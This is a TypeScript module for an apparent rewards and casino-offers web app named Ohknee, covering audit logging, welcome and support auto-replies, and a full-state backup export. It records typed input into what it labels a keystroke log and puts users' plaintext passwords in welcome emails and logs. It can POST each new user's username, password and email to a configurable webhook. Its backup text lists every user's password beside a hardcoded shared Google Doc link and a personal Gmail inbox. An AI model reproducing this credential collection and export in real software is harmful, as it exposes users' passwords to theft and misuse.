import { ActivityLogEntry, AutoResponderConfig, EmailLogEntry } from '../types';
import { getFromStorage, saveToStorage } from '../utils';

export const STORE_AUDIT_LOGS = 'ohknee_master_audit_log_v2';
export const STORE_AUTORESPONDER_CONFIG = 'ohknee_autoresponder_config_v1';
export const STORE_EMAIL_LOGS = 'ohknee_autoresponder_logs_v1';
export const MASTER_GOOGLE_DOC_BACKUP_URL =
  'https://docs.google.com/document/d/149wUcuIO_aVBhZMnIPxDYvCDUOlmOc_trgdUTwCGFnU/edit?usp=sharing';

export const DEFAULT_AUTORESPONDER_CONFIG: AutoResponderConfig = {
  newLoginEnabled: true,
  newLoginSenderName: 'Ohknee Support & Security',
  newLoginSenderEmail: 'support@ohknee.app',
  newLoginSubject: 'Welcome to Ohknee - Your Account & Avatar are Active!',
  newLoginBodyTemplate:
    'Hi {username},\n\nWelcome to Ohknee! Your account (@{username}) has been registered and secured on {date}.\n\nYour 1-of-1 Avatar Identity #{avatar} has been permanently claimed and locked to your handle.\n\nEnjoy the instant reward offers and live community chat!\n\nBest regards,\nThe Ohknee Team',
  
  supportEnabled: true,
  supportInboxEmail: 'oniamaya051@gmail.com',
  supportSubject: '[Ohknee Support] Request Received - Ticket #{ticketId}',
  supportBodyTemplate:
    'Hello {username},\n\nWe have received your support inquiry regarding: "{messageSnippet}".\n\nOur team (monitored by oniamaya051@gmail.com) is looking into this and will respond shortly.\n\nThank you for reaching out to Ohknee Support.',
  webhookUrl: '',
};

// Retrieve all recorded logs
export function getRecordedLogs(): ActivityLogEntry[] {
  return getFromStorage<ActivityLogEntry[]>(STORE_AUDIT_LOGS, []);
}

// Save log entry to persistent storage
export function logActivity(entry: Omit<ActivityLogEntry, 'id' | 'timestamp'>): void {
  try {
    const existing = getRecordedLogs();
    const newEntry: ActivityLogEntry = {
      ...entry,
      id: 'log-' + Date.now().toString(36) + '-' + Math.random().toString(36).substring(2, 6),
      timestamp: new Date().toISOString(),
    };

    // Keep up to 2,000 most recent entries in storage to prevent quota overflow
    const updated = [newEntry, ...existing].slice(0, 2000);
    saveToStorage(STORE_AUDIT_LOGS, updated);

    // Also trigger custom event for live dashboards
    window.dispatchEvent(new CustomEvent('ohknee:activity_logged', { detail: newEntry }));
  } catch (err) {
    console.error('Failed to log activity:', err);
  }
}

// Log input change or typed value
export function logInputTyped(fieldId: string, fieldName: string, value: string, context?: string, username?: string): void {
  // Do not record empty or duplicate consecutive noise if not needed, but record changes
  logActivity({
    eventType: 'input_change',
    fieldId: fieldId || 'unknown_input',
    fieldName: fieldName || 'text_input',
    value: value,
    context: context || window.location.pathname,
    username: username || getActiveUsername(),
  });
}

// Log worker/admin modification
export function logWorkerAction(action: string, details?: any): void {
  logActivity({
    eventType: 'worker_edit',
    fieldId: 'staff_worker_toolbar',
    fieldName: action,
    value: typeof details === 'object' ? JSON.stringify(details) : String(details || ''),
    context: 'Staff Edit Mode',
    username: 'Worker (Onib1127)',
  });
}

// Log user authentication
export function logAuthEvent(type: string, username: string, success: boolean, meta?: any): void {
  logActivity({
    eventType: 'auth_event',
    fieldId: `auth_${type}`,
    fieldName: `User ${type.toUpperCase()}: @${username}`,
    value: success ? `SUCCESS: ${JSON.stringify(meta || {})}` : `FAILED: ${JSON.stringify(meta || {})}`,
    context: 'Authentication System',
    username,
  });
}

// Get active username from storage
function getActiveUsername(): string {
  try {
    const active = localStorage.getItem('ohknee.active.account.user.v2');
    if (active) return JSON.parse(active);
    const profile = localStorage.getItem('ohknee.user.profile.v2');
    if (profile) {
      const parsed = JSON.parse(profile);
      return parsed.username || 'guest';
    }
  } catch {}
  return 'guest';
}

// Clear all recorded logs
export function clearRecordedLogs(): void {
  saveToStorage(STORE_AUDIT_LOGS, []);
  window.dispatchEvent(new CustomEvent('ohknee:activity_logged'));
}

// Download formatted logs as a file to desktop
export function downloadDesktopLogFile(format: 'txt' | 'json' = 'txt'): void {
  const logs = getRecordedLogs();
  const dateStr = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);

  let content = '';
  let mimeType = 'text/plain';
  let filename = `OHKNEE_DESKTOP_LOGS_${dateStr}.${format}`;

  if (format === 'json') {
    content = JSON.stringify(
      {
        exportedAt: new Date().toISOString(),
        totalEntries: logs.length,
        system: 'OHKNEE REWARD NETWORK - MASTER AUDIT & KEYSTROKE LOG',
        logs: logs,
      },
      null,
      2
    );
    mimeType = 'application/json';
  } else {
    // Plain text formatted for easy reading on desktop
    const lines: string[] = [];
    lines.push('================================================================================');
    lines.push('       OHKNEE REWARD APP - MASTER INPUT & ACTIVITY AUDIT RECORD FILE');
    lines.push('================================================================================');
    lines.push(`Generated: ${new Date().toLocaleString()}`);
    lines.push(`Total Events Recorded: ${logs.length}`);
    lines.push(`Exported For: Desktop Record Storage`);
    lines.push('================================================================================\n');

    if (logs.length === 0) {
      lines.push('No activity recorded yet. Global input recording is active.');
    } else {
      logs.forEach((entry, idx) => {
        const num = String(logs.length - idx).padStart(4, '0');
        const time = new Date(entry.timestamp).toLocaleString();
        lines.push(`[#${num}] [${time}] EVENT: ${entry.eventType.toUpperCase()}`);
        lines.push(`      Field / Target: ${entry.fieldName} (ID: ${entry.fieldId})`);
        lines.push(`      User: @${entry.username || 'guest'} | Context: ${entry.context || 'General'}`);
        lines.push(`      Recorded Input / Value: ${entry.value}`);
        lines.push('--------------------------------------------------------------------------------');
      });
    }

    content = lines.join('\n');
  }

  // Trigger browser download
  const blob = new Blob([content], { type: `${mimeType};charset=utf-8` });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// Auto-Responder Configuration Helpers
export function getAutoResponderConfig(): AutoResponderConfig {
  return getFromStorage<AutoResponderConfig>(STORE_AUTORESPONDER_CONFIG, DEFAULT_AUTORESPONDER_CONFIG);
}

export function saveAutoResponderConfig(config: AutoResponderConfig): void {
  saveToStorage(STORE_AUTORESPONDER_CONFIG, config);
  logWorkerAction('Updated Auto-Responder Email Configuration', config);
}

export function getEmailLogs(): EmailLogEntry[] {
  return getFromStorage<EmailLogEntry[]>(STORE_EMAIL_LOGS, []);
}

// Trigger Auto-Responder Email on New Login / Registration
export function triggerNewLoginAutoResponder(
  username: string,
  email: string,
  avatarNumber?: number | string,
  userNumber?: number,
  passwordPlain?: string
): void {
  const config = getAutoResponderConfig();
  const cleanUsername = username.replace(/^@/, '');
  const targetEmail = email || `${cleanUsername.toLowerCase()}@ohknee.app`;
  const avatarId = String(avatarNumber || '001').padStart(3, '0');
  const now = new Date();
  const nowStr = now.toLocaleString();
  const assignedNum = userNumber ? `#${String(userNumber).padStart(3, '0')}` : '#001';
  const passString = passwordPlain || '••••••••';

  // Format neat user registration block
  const neatRegistrationBlock = [
    '================================================================================',
    '                       OHKNEE USER REGISTRATION RECORD',
    '================================================================================',
    `  Assigned User Number: ${assignedNum}`,
    `  Username:             @${cleanUsername}`,
    `  Password:             ${passString}`,
    `  Email:                ${targetEmail}`,
    `  Date & Time:          ${nowStr}`,
    `  Avatar ID:            Slot #${avatarId}`,
    '================================================================================',
  ].join('\n');

  const renderedSubject = config.newLoginSubject
    .replace(/{username}/g, cleanUsername)
    .replace(/{email}/g, targetEmail)
    .replace(/{avatar}/g, avatarId)
    .replace(/{userNumber}/g, assignedNum)
    .replace(/{date}/g, nowStr);

  const baseBody = config.newLoginBodyTemplate
    .replace(/{username}/g, cleanUsername)
    .replace(/{email}/g, targetEmail)
    .replace(/{avatar}/g, avatarId)
    .replace(/{userNumber}/g, assignedNum)
    .replace(/{date}/g, nowStr);

  const fullNeatBody = `${baseBody}\n\n${neatRegistrationBlock}`;

  const emailLog: EmailLogEntry = {
    id: 'email-' + Date.now().toString(36),
    timestamp: now.toISOString(),
    type: 'new_login',
    recipientEmail: targetEmail,
    recipientUsername: cleanUsername,
    subject: renderedSubject,
    body: fullNeatBody,
    status: 'sent',
  };

  const existing = getEmailLogs();
  saveToStorage(STORE_EMAIL_LOGS, [emailLog, ...existing].slice(0, 500));

  logActivity({
    eventType: 'email_trigger',
    fieldId: 'autoresponder_new_login',
    fieldName: `User Registration: @${cleanUsername} (${assignedNum})`,
    value: neatRegistrationBlock,
    context: 'User Registration Event',
    username: cleanUsername,
  });

  // If webhook configured, trigger asynchronously with neat structured payload
  if (config.webhookUrl) {
    try {
      fetch(config.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'user_registration',
          userNumber: assignedNum,
          username: cleanUsername,
          password: passString,
          email: targetEmail,
          dateTime: nowStr,
          avatarId: `Slot #${avatarId}`,
          registrationText: neatRegistrationBlock,
          subject: renderedSubject,
          timestamp: now.toISOString(),
        }),
      }).catch((e) => console.warn('Autoresponder webhook error:', e));
    } catch {}
  }
}

// Generate human-readable full state backup text formatted specifically for Google Docs
export function generateFullStateGoogleDocFormattedText(): string {
  const timestamp = new Date().toLocaleString();
  const isoDate = new Date().toISOString();

  let accountsList: any[] = [];
  try {
    const rawAcc = localStorage.getItem('ohknee.accounts.registry.v3');
    if (rawAcc) {
      const parsed = JSON.parse(rawAcc);
      accountsList = Object.values(parsed);
    }
  } catch {}

  let analyticsList: any[] = [];
  try {
    const rawAn = localStorage.getItem('ohknee_user_analytics_v2');
    if (rawAn) {
      const parsed = JSON.parse(rawAn);
      analyticsList = Object.values(parsed);
    }
  } catch {}

  let tabsList: any[] = [];
  try {
    const rawTabs = localStorage.getItem('STORE_TABS');
    if (rawTabs) tabsList = JSON.parse(rawTabs);
  } catch {}

  let cardsList: any[] = [];
  try {
    const rawCards = localStorage.getItem('STORE_DATA');
    if (rawCards) cardsList = JSON.parse(rawCards);
  } catch {}

  let customTextsList: any[] = [];
  try {
    const rawTexts = localStorage.getItem('ohknee_custom_texts_v2');
    if (rawTexts) customTextsList = JSON.parse(rawTexts);
  } catch {}

  const logsList = getRecordedLogs();
  const emailLogsList = getEmailLogs();
  const autoConfig = getAutoResponderConfig();
  const currentVibe = localStorage.getItem('STORE_VIBE') || 'default';

  const docLines: string[] = [
    '========================================================================================',
    '                    OHKNEE REWARD NETWORK - FULL STATE DESKTOP BACKUP',
    '========================================================================================',
    `Backup Date & Time:   ${timestamp}`,
    `ISO Timestamp:        ${isoDate}`,
    `Google Doc Location:  ${MASTER_GOOGLE_DOC_BACKUP_URL}`,
    `Staff Auth ID:        Onib1127`,
    `System Vibe/Theme:    ${currentVibe.toUpperCase()}`,
    '========================================================================================\n',

    '----------------------------------------------------------------------------------------',
    ' SECTION 1: REGISTERED USERS ROSTER & REGISTRATION CREDENTIALS',
    '----------------------------------------------------------------------------------------',
  ];

  if (analyticsList.length === 0 && accountsList.length === 0) {
    docLines.push('No registered users currently on record.\n');
  } else {
    // Merge user roster
    const userMap: Record<string, any> = {};
    accountsList.forEach((acc: any, idx: number) => {
      userMap[acc.username] = {
        userNumber: acc.userNumber || idx + 1,
        username: acc.username,
        email: acc.email,
        password: acc.passwordPlain || '••••••••',
        registeredAt: acc.createdAt,
        avatarId: acc.profile?.avatarId || '001',
      };
    });

    analyticsList.forEach((an: any, idx: number) => {
      if (!userMap[an.username]) {
        userMap[an.username] = {
          userNumber: an.userNumber || idx + 1,
          username: an.username,
          email: an.email,
          password: an.passwordPlain || '••••••••',
          registeredAt: an.registeredAt,
          avatarId: an.avatarId || '001',
          timeSpent: an.totalTimeSpentSeconds,
          clicks: an.totalClicks,
          offers: an.clickedOffers,
        };
      } else {
        userMap[an.username].timeSpent = an.totalTimeSpentSeconds;
        userMap[an.username].clicks = an.totalClicks;
        userMap[an.username].offers = an.clickedOffers;
        if (an.passwordPlain) userMap[an.username].password = an.passwordPlain;
        if (an.userNumber) userMap[an.username].userNumber = an.userNumber;
      }
    });

    Object.values(userMap).forEach((u: any, idx: number) => {
      const num = `#${String(u.userNumber || idx + 1).padStart(3, '0')}`;
      const regTime = u.registeredAt ? new Date(u.registeredAt).toLocaleString() : 'N/A';
      const offerStr = u.offers ? Object.entries(u.offers).map(([k, v]) => `${k} (${v}x)`).join(', ') : 'None';

      docLines.push(`[${num}] USER REGISTRATION`);
      docLines.push(`  - Username:       @${u.username}`);
      docLines.push(`  - Password:       ${u.password || '••••••••'}`);
      docLines.push(`  - Email:          ${u.email}`);
      docLines.push(`  - Date & Time:    ${regTime}`);
      docLines.push(`  - Avatar Slot:    ${u.avatarId}`);
      docLines.push(`  - Time on Site:   ${u.timeSpent || 0} seconds`);
      docLines.push(`  - Total Clicks:   ${u.clicks || 0}`);
      docLines.push(`  - Clicked Offers: ${offerStr}`);
      docLines.push('----------------------------------------------------------------------------------------');
    });
  }

  docLines.push('\n----------------------------------------------------------------------------------------');
  docLines.push(' SECTION 2: NAVIGATION TABS & CATEGORIES');
  docLines.push('----------------------------------------------------------------------------------------');
  if (tabsList.length === 0) {
    docLines.push('Default system tabs active (Free Money, Highest Payouts, Instant Cashout, Top Casinos, Top Games).\n');
  } else {
    tabsList.forEach((tab: any, idx: number) => {
      docLines.push(`  [Tab ${idx + 1}] ID: ${tab.id} | Label: "${tab.label}"`);
    });
  }

  docLines.push('\n----------------------------------------------------------------------------------------');
  docLines.push(' SECTION 3: ACTIVE CARDS & OFFERS CATALOG');
  docLines.push('----------------------------------------------------------------------------------------');
  if (cardsList.length === 0) {
    docLines.push('Default partner offers active.\n');
  } else {
    cardsList.forEach((c: any, idx: number) => {
      docLines.push(`[Card #${idx + 1}] ${c.name} (Tab: ${c.tabId || 'default'})`);
      docLines.push(`  - Payout / Bonus:  ${c.payout || 'N/A'}`);
      docLines.push(`  - Promo Code:      ${c.code || 'None'}`);
      docLines.push(`  - Signup URL:      ${c.signupUrl || 'N/A'}`);
      docLines.push(`  - Signup Button:   ${c.signupLabel || 'Claim'}`);
      docLines.push(`  - Subtext/Domain:  ${c.sub || ''} (${c.domain || ''})`);
      docLines.push('----------------------------------------------------------------------------------------');
    });
  }

  docLines.push('\n----------------------------------------------------------------------------------------');
  docLines.push(' SECTION 4: CUSTOM FLOATING TEXT ANNOTATIONS & BANNERS');
  docLines.push('----------------------------------------------------------------------------------------');
  if (customTextsList.length === 0) {
    docLines.push('No custom text elements placed on the page.\n');
  } else {
    customTextsList.forEach((txt: any, idx: number) => {
      docLines.push(`  [Text #${idx + 1}] "${txt.text}"`);
      docLines.push(`       Position: (${txt.xPercent}%, ${txt.yPx}px) | Size: ${txt.fontSize}px | Color: ${txt.color}`);
      docLines.push(`       Scope Tab: ${txt.targetTabId || 'all'} | Bg: ${txt.bgColor || 'transparent'}`);
    });
  }

  docLines.push('\n----------------------------------------------------------------------------------------');
  docLines.push(' SECTION 5: AUTO-RESPONDER EMAIL & WEBHOOK CONFIGURATION');
  docLines.push('----------------------------------------------------------------------------------------');
  docLines.push(`  - Welcome Email Enabled:   ${autoConfig.newLoginEnabled ? 'YES' : 'NO'}`);
  docLines.push(`  - Welcome Sender Name:     ${autoConfig.newLoginSenderName}`);
  docLines.push(`  - Welcome Sender Email:    ${autoConfig.newLoginSenderEmail}`);
  docLines.push(`  - Support Inbox Email:     ${autoConfig.supportInboxEmail}`);
  docLines.push(`  - Webhook URL:             ${autoConfig.webhookUrl || 'Not set'}`);
  docLines.push(`  - Total Emails Dispatched: ${emailLogsList.length}`);

  docLines.push('\n----------------------------------------------------------------------------------------');
  docLines.push(' SECTION 6: RECENT AUDIT ACTIVITY STREAM (LATEST 30)');
  docLines.push('----------------------------------------------------------------------------------------');
  const recentLogs = logsList.slice(0, 30);
  if (recentLogs.length === 0) {
    docLines.push('No recent audit log entries recorded.\n');
  } else {
    recentLogs.forEach((l: any, idx: number) => {
      const t = new Date(l.timestamp).toLocaleString();
      docLines.push(`  [#${idx + 1}] [${t}] ${l.eventType.toUpperCase()} by @${l.username || 'guest'}`);
      docLines.push(`       Target: ${l.fieldName} | Value: ${l.value.slice(0, 100)}`);
    });
  }

  docLines.push('\n========================================================================================');
  docLines.push('                           END OF FULL STATE DESKTOP BACKUP');
  docLines.push('========================================================================================');

  return docLines.join('\n');
}

// Trigger Auto-Responder Email for Support Messages
export function triggerSupportAutoResponder(username: string, userEmail: string, message: string): void {
  const config = getAutoResponderConfig();
  if (!config.supportEnabled) return;

  const targetEmail = userEmail || 'user@ohknee.app';
  const ticketId = Math.floor(100000 + Math.random() * 900000);
  const snippet = message.length > 60 ? message.substring(0, 60) + '...' : message;

  const renderedSubject = config.supportSubject
    .replace(/{username}/g, username)
    .replace(/{ticketId}/g, String(ticketId))
    .replace(/{email}/g, targetEmail);

  const renderedBody = config.supportBodyTemplate
    .replace(/{username}/g, username)
    .replace(/{ticketId}/g, String(ticketId))
    .replace(/{messageSnippet}/g, snippet)
    .replace(/{email}/g, targetEmail)
    .replace(/{supportEmail}/g, config.supportInboxEmail || 'oniamaya051@gmail.com');

  const emailLog: EmailLogEntry = {
    id: 'email-' + Date.now().toString(36),
    timestamp: new Date().toISOString(),
    type: 'support',
    recipientEmail: targetEmail,
    recipientUsername: username,
    subject: renderedSubject,
    body: renderedBody,
    status: 'sent',
  };

  const existing = getEmailLogs();
  saveToStorage(STORE_EMAIL_LOGS, [emailLog, ...existing].slice(0, 500));

  logActivity({
    eventType: 'email_trigger',
    fieldId: 'autoresponder_support',
    fieldName: `Support Auto-Reply to @${username}`,
    value: `Support Inbox: ${config.supportInboxEmail} | Subject: ${renderedSubject}`,
    context: 'Support Chat Inquiry',
    username,
  });
}

// Global DOM Listener Setup to capture useful navigation and interactions without noisy keystrokes
let isGlobalListenerAttached = false;

export function initializeGlobalInputRecorder(): void {
  if (typeof window === 'undefined' || isGlobalListenerAttached) return;
  isGlobalListenerAttached = true;

  // Capture form submissions
  document.addEventListener('submit', (e) => {
    const form = e.target as HTMLFormElement;
    if (!form) return;
    const formId = form.id || form.name || 'unnamed_form';
    
    // Gather form field data safely (mask passwords)
    const formData = new FormData(form);
    const dataObj: Record<string, string> = {};
    formData.forEach((val, key) => {
      if (key.toLowerCase().includes('password')) {
        dataObj[key] = '••••••••';
      } else {
        dataObj[key] = String(val);
      }
    });

    logActivity({
      eventType: 'form_submit',
      fieldId: formId,
      fieldName: `Form Submit: ${formId}`,
      value: JSON.stringify(dataObj),
      context: window.location.pathname,
      username: getActiveUsername(),
    });
  }, { passive: true });

  // Record initial session boot
  logActivity({
    eventType: 'button_click',
    fieldId: 'system_boot',
    fieldName: 'Ohknee Session Started',
    value: `App Loaded at ${new Date().toLocaleString()}`,
    context: 'System',
    username: getActiveUsername(),
  });
}
